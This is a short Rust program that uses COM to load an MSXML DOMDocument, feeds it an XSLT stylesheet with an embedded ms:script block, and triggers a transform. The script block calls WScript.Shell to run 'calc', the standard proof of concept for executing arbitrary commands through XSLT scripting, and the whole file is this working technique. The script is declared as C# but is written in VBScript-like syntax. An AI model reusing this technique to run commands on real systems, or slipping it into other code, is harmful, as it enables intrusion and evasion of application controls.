use windows::core::Result;
use windows::Win32::Data::Xml::MsXml::{IXMLDOMDocument, IXMLDOMNode};
use windows::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
};
use windows_core::{Interface, BSTR, GUID};

pub fn main() -> Result<()> {
    unsafe {
        // Initialize COM with multithreaded apartment model
        CoInitializeEx(None, COINIT_MULTITHREADED).ok()?;

        // Create an instance of MSXML DOMDocument
        let clsid = GUID::from_u128(0xF5078F32_C551_11D3_89B9_0000F81FE221); // CLSID_DOMDocument
        let doc: IXMLDOMDocument = CoCreateInstance(&clsid, None, CLSCTX_INPROC_SERVER)?;

        // Define an XSLT stylesheet with embedded script
        let xml = r#"<?xml version='1.0'?>
        <stylesheet
            xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
            xmlns:user="placeholder"
            version="1.0">

        <output method="text"/>
            <ms:script implements-prefix="user" language="C#">
                <![CDATA[
                    Set shell = CreateObject("WScript.Shell")
                    shell.Run "calc"
                ]]>
            </ms:script>

        </stylesheet>
        "#;

        // Load the XML into the DOMDocument
        doc.loadXML(&BSTR::from(xml))?;

        // Cast to a generic IXMLDOMNode for transformation
        let node = doc.cast::<IXMLDOMNode>()?;

        // Perform transformation — depending on host config, may execute ms:script
        doc.transformNode(&node)?;
    }

    Ok(())
}
